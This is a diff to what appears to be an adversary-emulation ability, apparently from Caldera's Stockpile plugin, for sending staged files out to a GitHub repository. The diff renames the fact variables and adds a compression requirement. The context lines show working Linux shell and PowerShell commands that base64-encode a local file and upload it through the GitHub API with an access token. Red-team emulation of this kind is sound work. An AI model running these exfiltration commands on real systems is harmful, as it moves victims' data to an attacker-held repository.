@@ -9,11 +9,11 @@
     linux: # https://docs.github.com/en/rest/reference/repos#contents
       sh:
         command: |
-          GHUser="#{github.user.name}";
-          GHRepo="#{github.repository.name}";
-          GHPAT="#{github.access.token}";
-          GHBranch='#{github.repository.branch}';
-          LocalFile='#{host.dir.compress}';
+          GHUser="#{custom.github_username}";
+          GHRepo="#{custom.github_repository}";
+          GHPAT="#{custom.github_token}";
+          GHBranch='#{custom.github_branch}';
+          LocalFile='#{file.staged_at}';
           Header="Authorization: token $GHPAT";
           RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
           echo "{\"message\":\"Committed $RemoteName\", \"branch\":\"$GHBranch\", \"content\":\"" >/tmp/b64;
@@ -24,16 +24,16 @@
     windows:
       psh,pwsh: # https://docs.github.com/en/rest/reference/repos#contents
         command: |
-          $GHUser = "#{github.user.name}";
-          $GHRepo = "#{github.repository.name}";
-          $GHPAT = "#{github.access.token}";
-          $GHBranch = '#{github.repository.branch}';
+          $GHUser = "#{custom.github_username}";
+          $GHRepo = "#{custom.github_repository}";
+          $GHPAT = "#{custom.github_token}";
+          $GHBranch = '#{custom.github_branch}';
           $token = $GHUser + ":" + $GHPAT;
           $basetoken = [System.Convert]::ToBase64String([char[]]$token);
           $Headers = @{
               Authorization = 'Basic {0}' -f $basetoken;
           };
-          $file = (Get-Item #{host.dir.compress});
+          $file = (Get-Item #{file.staged_at});
           $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)";
           $uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;
 
@@ -53,4 +53,7 @@
           }
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-        - source: host.dir.compress
+        - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+        - source: file.staged_at
+          edge: is_compressed
